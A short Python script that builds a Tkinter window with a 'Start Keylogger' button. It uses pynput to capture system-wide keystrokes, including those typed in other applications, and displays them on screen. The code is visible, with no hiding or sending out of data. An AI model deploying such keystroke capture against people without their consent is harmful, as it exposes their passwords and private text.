# pip install pynput tk
import tkinter as tk
from pynput import keyboard
import threading

log_data = ""

def on_press(key):
    global log_data
    try:
        log_data += key.char  # Normal keys
    except AttributeError:
        log_data += f" [{key}] "  # Special keys (Enter, Shift, etc.)
    
    log_text.config(state=tk.NORMAL)
    log_text.insert(tk.END, f"{key} ")
    log_text.config(state=tk.DISABLED)

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# GUI Setup
root = tk.Tk()
root.title("🔑 Keylogger")

log_text = tk.Text(root, height=10, width=50, state=tk.DISABLED)
log_text.pack(pady=10)

start_button = tk.Button(root, text="Start Keylogger", command=lambda: threading.Thread(target=start_keylogger).start())
start_button.pack()

root.mainloop()
